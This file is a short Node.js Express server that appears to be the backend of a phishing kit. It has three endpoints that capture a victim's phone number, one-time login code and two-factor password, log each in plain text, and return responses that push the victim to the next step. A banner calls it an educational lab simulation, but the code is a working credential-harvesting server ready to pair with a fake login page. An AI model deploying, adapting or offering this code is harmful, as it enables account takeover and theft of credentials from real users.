const express = require('express');
const path = require('path');
const app = express();

// ============================================
// ASCII LOGO – displayed on server start
// ============================================
const logo = `
\x1b[36m
███╗   ███╗ █████╗ ███████╗██╗   ██╗
████╗ ████║██╔══██╗██╔════╝██║   ██║
██╔████╔██║███████║███████╗██║   ██║
██║╚██╔╝██║██╔══██║╚════██║██║   ██║
██║ ╚═╝ ██║██║  ██║███████║╚██████╔╝
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝
\x1b[0m
`;
const warning = `
\x1b[33m⚠️  EDUCATIONAL SIMULATION – DO NOT USE FOR ILLEGAL PURPOSES ⚠️
This server logs credentials ONLY for learning in isolated labs.
Any malicious use is prohibited.\x1b[0m
`;

app.use(express.json());
app.use(express.static(__dirname));

// API endpoints
app.post('/api/send-code', (req, res) => {
    const { phone, access_key } = req.body;
    console.log(`\n[📞 PHONE] ${phone} | Key: ${access_key}`);
    res.json({ ok: true, already_authorized: false });
});

app.post('/api/verify-code', (req, res) => {
    const { phone, code, access_key } = req.body;
    console.log(`[🔐 CODE] ${phone} | Code: ${code}`);
    res.json({ ok: true, needs_2fa: true });
});

app.post('/api/verify-2fa', (req, res) => {
    const { phone, password, access_key } = req.body;
    console.log(`[⚠️ PASSWORD] ${phone} | PW: ${password}`);
    res.json({ ok: true });
});

const PORT = 80;
app.listen(PORT, () => {
    console.log(logo);
    console.log(warning);
    console.log(`\x1b[32m✓ Server running on http://localhost:${PORT}\x1b[0m`);
    console.log(`\x1b[36m✓ Place your index.html in the same folder\x1b[0m\n`);
});
